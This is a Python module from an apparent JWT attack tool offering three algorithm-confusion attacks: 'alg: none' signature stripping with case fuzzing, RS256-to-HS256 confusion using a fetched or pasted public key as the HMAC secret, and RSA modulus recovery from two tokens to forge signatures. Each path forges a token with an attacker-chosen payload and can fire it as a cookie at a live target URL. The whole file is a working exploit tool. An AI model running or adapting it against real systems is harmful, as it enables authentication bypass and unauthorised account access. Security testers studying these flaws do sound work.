import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from helpers import *

def run_algorithm_none():
    token = input(f"\n{YELLOW}[?] Enter Original JWT: {RESET}").strip()
    parts = token.split('.')
    if len(parts) < 2:
        print(f"{RED}[!] Error: Invalid JWT format.{RESET}")
        return

    try:
        # 1. Prepare Header and Fuzz Algorithm
        header_b64 = parts[0]
        header_b64 += "=" * ((4 - len(header_b64) % 4) % 4)
        header_data = json.loads(base64.urlsafe_b64decode(header_b64).decode('utf-8'))

        print(f"\n{CYAN}[*] Select 'none' variation (Case Fuzzing):{RESET}")
        print("1. standard (none)")
        print("2. capitalized (None)")
        print("3. all-caps (NONE)")
        print("4. mixed-case (nOnE)")
        
        alg_choice = input(f"{YELLOW}jwtmap/none > {RESET}").strip()
        
        alg_val = "none"
        if alg_choice == '2': alg_val = "None"
        elif alg_choice == '3': alg_val = "NONE"
        elif alg_choice == '4': alg_val = "nOnE"

        header_data['alg'] = alg_val
        new_h_b64 = b64_e(json.dumps(header_data, separators=(',', ':')))

        # 2. Payload Editor
        p_b64 = parts[1]
        p_b64 += "=" * ((4 - len(p_b64) % 4) % 4)
        current_p = base64.urlsafe_b64decode(p_b64).decode('utf-8')
        print(f"\n{CYAN}[*] Original Payload: {RESET}{current_p}")
        
        while True:
            new_p_input = input(f"{YELLOW}[?] Enter NEW Payload: {RESET}").strip()
            try:
                new_p_json = json.loads(new_p_input)
                new_p_b64 = b64_e(json.dumps(new_p_json, separators=(',', ':')))
                break
            except json.JSONDecodeError as e:
                print(f"{RED}[!] Invalid JSON: {e}. Try again.{RESET}")

        # 3. Craft Token (Stripping Signature)
        exploit_token = f"{new_h_b64}.{new_p_b64}."
        print(f"\n{PURPLE}--- CRAFTED EXPLOIT (alg: {alg_val}) ---{RESET}")
        print(f"{RED}{exploit_token}{RESET}")
        print(f"{PURPLE}--------------------------------{RESET}")

        # 4. Optional Live Test
        test_choice = input(f"\n{YELLOW}[?] Test this token on a live target? (Y/N): {RESET}").strip().upper()
        if test_choice in ['Y', 'YES', '']:
            target_url = input(f"{YELLOW}[?] Enter Target URL: {RESET}").strip()
            cookie_name = input(f"{YELLOW}[?] Enter Cookie Name (e.g., session): {RESET}").strip()
            
            print(f"{CYAN}[*] Sending injection to {target_url}...{RESET}")
            cookies = {cookie_name: exploit_token}
            resp = requests.get(target_url, cookies=cookies, verify=False, timeout=10, allow_redirects=False)
            
            print(f"{CYAN}[*] Status: {resp.status_code}{RESET}")
            if resp.status_code == 200:
                print(f"{GREEN}[+] SUCCESS! Check response for changes.{RESET}")
            elif resp.status_code in [301, 302]:
                print(f"{YELLOW}[-] Redirected ({resp.status_code}). Might be filtered.{RESET}")
            else:
                print(f"{RED}[-] Failed. Status Code: {resp.status_code}{RESET}")

    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"\n{CYAN}[>] Press Enter to return to menu...{RESET}")


def run_algorithm_confusion():
    fuzz_choice = input(f"\n{YELLOW}[?] Fuzz for exposed JWKS/Keys first? (Y/N): {RESET}").strip().upper()
    if fuzz_choice in ['Y', 'YES']:
        target_base = input(f"{YELLOW}[?] Enter Base URL: {RESET}").strip().rstrip('/')
        
        
        wordlist_path = get_wordlist_path("exposed_keys.txt")
        
        if os.path.exists(wordlist_path):
            print(f"{CYAN}[*] Searching for potential key endpoints...{RESET}")
            with open(wordlist_path, "r") as f:
                for line in f:
                    endpoint = line.strip().lstrip('/')
                    url = f"{target_base}/{endpoint}"
                    try:
                        r = requests.get(url, verify=False, timeout=5, allow_redirects=False)
                        if r.status_code == 200:
                            print(f"{GREEN}[+] POTENTIAL KEY FOUND: {url}{RESET}")
                    except: 
                        continue
        else:
            print(f"{RED}[!] {wordlist_path} not found.{RESET}")

    print(f"\n{CYAN}[*] Step 2: Provide the Public Key (JWK object from the 'keys' array){RESET}")
    print(f"{MAGENTA}Example: {RESET}{{\"kty\":\"RSA\",\"e\":\"AQAB\",\"n\":\"...\"}}")
    
    jwk_input = input(f"\n{YELLOW}[?] Paste the JWK object: {RESET}").strip()
    
    try:
        jwk_data = json.loads(jwk_input)
        if "keys" in jwk_data:
            jwk_data = jwk_data['keys'][0]
    except Exception as e:
        print(f"{RED}[!] Error: Invalid JSON format. {e}{RESET}")
        return

    print(f"\n{CYAN}[*] Select Public Key Format for HMAC Secret:{RESET}")
    print("1. X.509 PEM (Standard)")
    print("2. PKCS#1 PEM (RSA Specific)")
    print("3. Raw DER (Binary blob)")
    fmt_choice = input(f"{YELLOW}jwtmap/confusion > {RESET}").strip()

    try:
        n_int = int.from_bytes(b64_d(jwk_data['n']), 'big')
        e_int = int.from_bytes(b64_d(jwk_data['e']), 'big')
        public_numbers = rsa.RSAPublicNumbers(e_int, n_int)
        public_key = public_numbers.public_key()
        
        if fmt_choice == '2':
            pem_key = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.PKCS1
            )
            print(f"{GREEN}[+] Converted to PKCS#1 PEM.{RESET}")
        elif fmt_choice == '3':
            pem_key = public_key.public_bytes(
                encoding=serialization.Encoding.DER,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            print(f"{GREEN}[+] Converted to Raw DER Binary.{RESET}")
        else:
            pem_key = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            print(f"{GREEN}[+] Converted to X.509 PEM (Default).{RESET}")

    except Exception as e:
        print(f"{RED}[!] Key processing error: {e}{RESET}")
        return

    token = input(f"\n{YELLOW}[?] Enter Original JWT: {RESET}").strip()
    parts = token.split('.')
    if len(parts) < 2: return

    try:
        header = json.loads(b64_d(parts[0]))
        header['alg'] = 'HS256'
        new_h_b64 = b64_e(json.dumps(header, separators=(',', ':')))

        payload = json.loads(b64_d(parts[1]))
        print(f"{CYAN}[*] Current Payload: {RESET}{json.dumps(payload)}")
        new_p_input = input(f"{YELLOW}[?] Enter NEW JSON Payload: {RESET}").strip()
        new_p_json = json.loads(new_p_input)
        new_p_b64 = b64_e(json.dumps(new_p_json, separators=(',', ':')))

        signing_input = f"{new_h_b64}.{new_p_b64}".encode()
        # HMAC sign using the selected key format bytes
        sig = hmac.new(pem_key, signing_input, hashlib.sha256).digest()
        exploit_token = f"{new_h_b64}.{new_p_b64}.{b64_e(sig)}"

        print(f"\n{PURPLE}--- GENERATED ALGORITHM CONFUSION TOKEN ---{RESET}")
        print(f"{RED}{exploit_token}{RESET}")
        print(f"{PURPLE}--------------------------------------------{RESET}")

        test = input(f"\n{YELLOW}[?] Test on target? (Y/N): {RESET}").strip().upper()
        if test in ['Y', 'YES']:
            target_url = input(f"{YELLOW}[?] Enter Target URL: {RESET}").strip()
            cookie_name = input(f"{YELLOW}[?] Enter Cookie Name: {RESET}").strip()
            resp = requests.get(target_url, cookies={cookie_name: exploit_token}, verify=False, timeout=10)
            print(f"{CYAN}[*] Status: {resp.status_code}{RESET}")
            if resp.status_code == 200:
                print(f"{GREEN}[+] SUCCESS! Access granted.{RESET}")

    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    
    input(f"\n{CYAN}[>] Press Enter to return to menu...{RESET}")

def run_sig2n_confusion():
    print(f"\n{PURPLE}--- SIG2N KEY DERIVATION & EXPLOIT ---{RESET}")
    jwt0 = input(f"{YELLOW}[?] Enter JWT #1: {RESET}").strip()
    jwt1 = input(f"{YELLOW}[?] Enter JWT #2: {RESET}").strip()
    target_url = input(f"{YELLOW}[?] Enter Target URL: {RESET}").strip()
    cookie_name = input(f"{YELLOW}[?] Enter Cookie Name: {RESET}").strip()
    
    if not jwt0 or not jwt1: return
    try:
        def get_params(token):
            parts = token.split('.')
            sig_bytes = b64_d(parts[2])
            msg_input = f"{parts[0]}.{parts[1]}".encode('ascii')
            msg_hash = hashlib.sha256(msg_input).digest()
            prefix = b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20'
            pad_len = len(sig_bytes) - len(prefix) - len(msg_hash) - 3
            padded = b'\x00\x01' + (b'\xff' * pad_len) + b'\x00' + prefix + msg_hash
            return bytes2mpz(sig_bytes), bytes2mpz(padded)

        s0, m0 = get_params(jwt0); s1, m1 = get_params(jwt1)
        print(f"{CYAN}[*] Recovering Modulus n (GMPY2)...{RESET}")
        valid_n = None; final_e = 65537
        for e in [mpz(65537), mpz(3)]:
            gcd_res = gcd(pow(s0, e) - m0, pow(s1, e) - m1)
            for mult in range(1, 101):
                potential_n = c_div(gcd_res, mpz(mult))
                if potential_n > 2**512 and pow(s0, e, potential_n) == m0:
                    valid_n = int(potential_n); final_e = int(e); break
            if valid_n: break
        
        if not valid_n:
            print(f"{RED}[!] Failed to derive n.{RESET}"); return
        
        print(f"{GREEN}[+] Modulus Recovered! ({valid_n.bit_length()} bits){RESET}")
        pub = rsa.RSAPublicNumbers(final_e, valid_n).public_key()
        
        formats = {"X.509": serialization.PublicFormat.SubjectPublicKeyInfo, "PKCS1": serialization.PublicFormat.PKCS1}
        valid_pem = None
        for name, fmt in formats.items():
            pem = pub.public_bytes(serialization.Encoding.PEM, fmt)
            h = b64_e(json.dumps({"alg":"HS256"}, separators=(',', ':')))
            p = jwt0.split('.')[1]
            sig = hmac.new(pem, f"{h}.{p}".encode(), hashlib.sha256).digest()
            test_token = f"{h}.{p}.{b64_e(sig)}"
            print(f"{CYAN}[*] Testing {name} format...{RESET}", end=" ")
            try:
                if requests.get(target_url, cookies={cookie_name: test_token}, verify=False, timeout=5).status_code == 200:
                    print(f"{GREEN}VALID{RESET}")
                    valid_pem = pem; break
                else: print(f"{RED}FAILED{RESET}")
            except: print(f"{RED}ERROR{RESET}")

        if not valid_pem:
            print(f"{RED}[!] No valid PEM format found.{RESET}"); return

        p_b64 = jwt0.split('.')[1]
        p_b64 += "=" * ((4 - len(p_b64) % 4) % 4)
        print(f"\n{CYAN}[*] Original Payload: {RESET}{base64.urlsafe_b64decode(p_b64).decode()}")
        
        new_payload_str = input(f'{YELLOW}[?] Enter NEW JSON Payload: {RESET}').strip()
        new_h_b64 = b64_e(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',', ':')))
        new_p_b64 = b64_e(new_payload_str)
        
        new_sig = hmac.new(valid_pem, f"{new_h_b64}.{new_p_b64}".encode(), hashlib.sha256).digest()
        exploit = f"{new_h_b64}.{new_p_b64}.{b64_e(new_sig)}"
        
        print(f"\n{GREEN}[+] FORGED JWT (Algorithm Confusion):{RESET}\n{RED}{exploit}{RESET}")

    except Exception as e: print(f"{RED}[!] Error: {e}{RESET}")
    input(f"\n{CYAN}[>] Press Enter to return...{RESET}")

def alg_confusion_menu():
    while True:
        print(f"\n{PURPLE}--- ALGORITHM CONFUSION ATTACK MENU ---{RESET}")
        print(f"1. Algorithm Downgrade (alg: none)")
        print(f"2. Asymmetric-to-Symmetric Confusion (RS256 -> HS256)")
        print(f"3. Algorithm Confusion via Public Key Derivation")
        print(f"4. Back to Main Menu")
        
        choice = input(f"\n{CYAN}jwtmap/alg > {RESET}").strip()
        
        if choice == '1': run_algorithm_none()
        elif choice == '2': run_algorithm_confusion()
        elif choice == '3': run_sig2n_confusion()
        elif choice == '4': break